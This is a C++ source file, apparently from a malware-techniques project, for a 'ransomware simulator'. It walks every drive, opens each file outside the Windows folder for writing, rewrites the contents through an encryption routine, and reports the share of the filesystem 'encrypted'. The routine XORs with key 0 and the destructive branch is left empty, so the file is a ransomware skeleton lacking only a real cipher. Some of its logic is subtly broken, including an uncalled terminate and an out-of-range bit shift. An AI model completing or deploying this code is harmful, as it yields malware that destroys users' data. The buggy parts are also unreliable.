#include "../Logger/logger.h"
#include "../MalwareTechniques/ntdll.h"
#include "ransomware.h"

#include <exception>
#include <iostream>
#include <stdexcept>
#include <string>
#include <string_view>

#include <Windows.h>
#include <utility>
#include <iomanip>
#include <sstream>


namespace maltech {

    namespace ransom {

        RansomwareSimulator::RansomwareSimulator(ntdll::NtDll& ntdll)
            : ntdll_(ntdll)
        {
        }

        void RansomwareSimulator::StartEncryptingSimulation() {
            DWORD drivers = GetLogicalDrives();
            const int bits_in_byte = 8;
            const int dword_bits_size = sizeof(DWORD) * bits_in_byte;
            for (DWORD i = 0; i <= dword_bits_size; ++i) {
                DWORD bit_checker = 1;
                if ((bit_checker << (dword_bits_size - i)) & drivers) {
                    char disk = 'A' + (dword_bits_size - i);
                    std::string path;
                    path += disk;
                    path += ":\\*";
                    try {
                        thread_pool_.AddTask([path, self = shared_from_this()]() {
                            self->ProcessCatalogue(path);
                            });
                    }
                    catch (const std::exception& e) {
                        LOG_ERROR("Encrypting error: "s + e.what());
                    }
                }
            }
            thread_pool_.WaitAllTasks();
            double crypted_persentege = (crypted_count_.load() * 100.0 / files_count_.load());
            std::ostringstream strm;
            strm << std::setprecision(2)
                << crypted_persentege
                << "% of your filesystem "
                "successfully encrypted.";
            MessageBoxA(NULL, strm.str().data(), "Result", MB_OK);
        }

        void RansomwareSimulator::ProcessCatalogue(std::string_view path) {
            LOG_DEBUG("Processing catalogue " + std::string(path));
            WIN32_FIND_DATA data{ 0 };
            HANDLE hDirEntry = FindFirstFileA(path.data(), &data);
            if (!hDirEntry || hDirEntry == INVALID_HANDLE_VALUE) {
                throw std::runtime_error("Can't open " 
                    + std::string(path)
                    + ". Error code: " 
                    + std::to_string(GetLastError()));
            }

            do {
                if (std::string(data.cFileName) == ".." 
                    || std::string(data.cFileName) == "."
                    || std::string(data.cFileName) == "Windows") {
                    continue;
                }
                std::string full_path = std::string(path.substr(0, path.size() - 1)) 
                    + data.cFileName;
                if (data.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
                    try {
                        ProcessCatalogue(
                            std::string(path.substr(0, path.size() - 1))
                            + data.cFileName + "\\*");
                    }
                    catch (const std::exception& e) {
                        LOG_ERROR("Encrypting error: "s + e.what());
                    }
                }
                else {
                    ++files_count_;
                    thread_pool_
                        .AddTask([self = shared_from_this(), path = std::move(full_path)]() {
                        self->ImitateFileIncryption(path);
                            });
                }
            } while (FindNextFileA(hDirEntry, &data));
            FindClose(hDirEntry);
        }

        void RansomwareSimulator::ImitateFileIncryption(std::string_view path) {
            try {
                HANDLE hFile = OpenFile(path);
                ProcessFileEncrypting(hFile);
                ++crypted_count_;
                LOG_INFO("[crypted] - " + std::string(path));
            }
            catch (const std::exception& e) {
                LOG_ERROR(e.what());
            }

        }

        HANDLE RansomwareSimulator::OpenFile(std::string_view path) {
            HANDLE hFile = CreateFileA(
                path.data(),
                GENERIC_READ | GENERIC_WRITE,
                0,
                NULL,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN,
                NULL
            );
            if (!hFile || hFile == INVALID_HANDLE_VALUE) {
                throw std::runtime_error("Can't open " + std::string(path));
            }
            return hFile;
        }

        void RansomwareSimulator::ProcessFileEncrypting(HANDLE hFile) {
            const DWORD buffer_size = 4096;
            char buffer[buffer_size]{};
            DWORD bytes_readed{ 0 };
            DWORD bytes_writen{ 0 };
            while (ReadFile(hFile, &buffer, buffer_size, &bytes_readed, NULL)) {
                if (!bytes_readed) {
                    break;
                }
                EncryptBytes(buffer, bytes_readed);
                SetFilePointer(hFile, -bytes_readed, NULL, FILE_CURRENT);
                WriteFile(hFile, buffer, bytes_readed, &bytes_writen, NULL);
                if (bytes_readed < buffer_size) {
                    break;
                }
            }
        }

        void RansomwareSimulator::EncryptBytes(char* bytes, DWORD size,
            bool destructive_mode) {
            if (destructive_mode) {
                
            }
            else {
                const int key = 0;
                for (int i = 0; i < size; ++i) {
                    if (key) { std::terminate; }
                    bytes[i] ^= key;
                }
            }
        }
        
    }

}